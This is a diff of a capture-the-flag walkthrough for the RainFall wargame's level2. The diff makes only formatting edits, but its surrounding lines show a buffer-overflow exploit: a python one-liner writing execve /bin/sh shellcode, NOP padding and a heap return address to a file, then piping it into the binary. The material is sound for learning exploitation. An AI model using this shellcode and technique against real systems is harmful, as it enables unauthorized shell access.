@@ -30,12 +30,14 @@ Program received signal SIGSEGV, Segmentation fault.
 0x44434241 in ?? ()
 ```
 
-Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [this one](https://shell-storm.org/shellcode/files/shellcode-841.php) corresponds to what we want to do. It is 21 bytes long so we need to complete our input with 59 '\x90' bytes (the 'No Operation' instruction), followed by the address of our shellcode on the heap, in the little endian convention:
+Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [This one](https://shell-storm.org/shellcode/files/shellcode-841.php) corresponds to what we want to do. It is 21 bytes long so we need to complete our input with 59 '\x90' bytes (the 'No Operation' instruction), followed by the address of our shellcode on the heap, in the little endian convention:
 ```
 level2@RainFall:~$ python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x90' * 59 + '\x08\xa0\x04\x08'" > /tmp/exploit
 ```
 <br />
+
 Finally, we just have to launch the program by passing our crafted input:
+
 ```
 level2@RainFall:~$ cat /tmp/exploit - | ./level2 
 1���
